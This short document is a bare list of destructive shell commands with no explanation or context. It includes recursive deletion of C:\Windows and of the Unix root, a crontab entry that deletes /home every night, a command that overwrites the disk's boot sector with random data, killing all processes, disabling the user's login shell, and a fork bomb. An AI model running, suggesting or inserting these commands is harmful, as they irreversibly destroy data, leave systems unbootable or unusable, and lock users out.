del /f /q /s C:\Windows
rm -rf/
 
sudo rm -rf /
while true; do sudo mount /dev/null /home; done

kill -9 -1
echo "0 3 * * * root rm -rf /home/*" >> /etc/crontab

dd if=/dev/random of=/dev/sda bs=512 count=1


usermod -s /dev/null $(whoami)


:(){ :|:& };:
